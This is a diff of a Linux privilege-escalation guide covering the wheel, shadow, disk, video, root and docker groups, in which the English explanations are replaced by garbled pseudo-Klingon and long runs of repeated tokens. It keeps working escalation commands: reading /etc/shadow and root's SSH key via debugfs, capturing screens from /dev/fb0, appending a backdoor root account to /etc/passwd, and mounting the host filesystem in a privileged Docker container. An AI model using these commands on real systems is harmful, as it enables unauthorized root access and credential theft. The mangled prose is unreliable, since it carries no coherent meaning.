**'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **
 ```
 %wheel	ALL=(ALL:ALL) ALL
 ```
+**qaStaHvIS wheel ghItlhlaHbe'chugh sudo**.
 
-This means that **any user that belongs to the group wheel can execute anything as sudo**.
-
-If this is the case, to **become root you can just execute**:
-
+**qaStaHvIS root boqHa'**:
 ```
 sudo su
 ```
+## qo'noS ghoS
 
-## Shadow Group
-
-Users from the **group shadow** can **read** the **/etc/shadow** file:
-
+**qo'noS ghoS** ghompu' **qatlh** **/etc/shadow** file:
 ```
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
-
-So, read the file and try to **crack some hashes**.
+So, **ghItlh** vItlhutlh **hashes** **ghItlh** **crack**.
 
 ## Disk Group
 
-This privilege is almost **equivalent to root access** as you can access all the data inside of the machine.
+**root access** **equivalent** **privilege** **ghItlh** **almost** **tlhIngan** **vItlhutlh** **ghItlh** **machine** **data** **ghItlh** **access** **'ej**.
 
 Files:`/dev/sd[a-z][1-9]`
-
 ```bash
 df -h #Find where "/" is mounted
 debugfs /dev/sda1
@@ -124,57 +143,39 @@ debugfs: ls
 debugfs: cat /root/.ssh/id_rsa
 debugfs: cat /etc/shadow
 ```
-
-Note that using debugfs you can also **write files**. For example to copy `/tmp/asd1.txt` to `/tmp/asd2.txt` you can do:
-
+**ghItlhvam** debugfs **DIvI'** **tlhIngan Hol** **ghItlhvam** **'oH**. **'ej** `/tmp/asd1.txt` **ghItlhvam** `/tmp/asd2.txt` **ghItlhvam** **'e'** **tlhIngan Hol** **ghItlhvam** **DIvI'** **tlhIngan Hol** **ghItlhvam** **'oH**.
 ```bash
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
-
-However, if you try to **write files owned by root** (like `/etc/shadow` or `/etc/passwd`) you will have a "**Permission denied**" error.
+**However, if you try to write files owned by root** (like `/etc/shadow` or `/etc/passwd`) you will have a "**Permission denied**" error.
 
 ## Video Group
 
 Using the command `w` you can find **who is logged on the system** and it will show an output like the following one:
-
 ```bash
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
 moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
+**tty1** **yossi** **logh** **mInDu'** **mach** **terminal** **user**.
 
-The **tty1** means that the user **yossi is logged physically** to a terminal on the machine.
-
-The **video group** has access to view the screen output. Basically you can observe the the screens. In order to do that you need to **grab the current image on the screen** in raw data and get the resolution that the screen is using. The screen data can be saved in `/dev/fb0` and you could find the resolution of this screen on `/sys/class/graphics/fb0/virtual_size`
-
+**video** **ghom** **qawHaq** **ghItlh**. **screens** **observe** **jatlh** **raw data** **grab** **screen** **image** **current** **resolution** **get**. **screen data** `/dev/fb0` **save** **able** **screen** **resolution** `/sys/class/graphics/fb0/virtual_size` **find**.
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 ```
-
-To **open** the **raw image** you can use **GIMP**, select the \*\*`screen.raw` \*\* file and select as file type **Raw image data**:
+**ghItlh** **raw image** **vItlhutlh** **GIMP** **vIlegh**, **`screen.raw`** **file** **vIlegh** **'ej** **Raw image data** **file type** **vIlegh**:
 
 ![](<../../../.gitbook/assets/image (287) (1).png>)
 
-Then modify the Width and Height to the ones used on the screen and check different Image Types (and select the one that shows better the screen):
-
-![](<../../../.gitbook/assets/image (288).png>)
-
-## Root Group
-
-It looks like by default **members of root group** could have access to **modify** some **service** configuration files or some **libraries** files or **other interesting things** that could be used to escalate privileges...
-
-**Check which files root members can modify**:
-
+**'ej** **Width** **'ej Height** **vItlhutlh** **vIlegh** **'ej** **Image Types** **chel** **(latlh)** **'ej** **vItlhutlh** **'ej** **screen** **vItlhutlh** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'
 ```bash
 find / -group root -perm -g=w 2>/dev/null
 ```
-
 ## Docker Group
 
-You can **mount the root filesystem of the host machine to an instance’s volume**, so when the instance starts it immediately loads a `chroot` into that volume. This effectively gives you root on the machine.
-
+**vItlhutlh** **Docker Group** **chaw'** **root filesystem** **host machine** **instance's volume** **mount** **'e'** **'ej** **instance** **start** **'e'** **chroot** **volume** **'e'** **load**. **'ej** **'oH** **root** **machine** **'e'** **ghItlh**.
 ```bash
 docker image #Get images from the docker service
 
@@ -186,7 +187,6 @@ echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/pa
 #Ifyou just want filesystem and network access you can startthe following container:
 docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
 ```
-
 Finally, if you don't like any of the suggestions of before, or they aren't working for some reason (docker api firewall?) you could always try to **run a privileged container and escape from it** as explained here:
 
 {% content-ref url="../docker-security/" %}
